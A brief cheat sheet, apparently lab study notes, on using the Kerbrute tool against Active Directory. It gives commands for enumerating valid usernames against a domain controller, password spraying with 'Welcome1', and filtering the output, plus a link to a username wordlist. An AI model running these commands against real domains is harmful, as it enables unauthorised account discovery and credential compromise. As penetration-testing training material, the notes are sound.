[Kerbrute](https://github.com/ropnop/kerbrute)

for prebuit usernames there is a resource: https://github.com/insidetrust/statistically-likely-usernames

checking valid usernames:
```shell
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
-o: output

password spraying:
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```


> append this to get only usernames:
```shell
grep "VALID USERNAME" | awk '{print $NF}' | cut -d'@' -f1
```

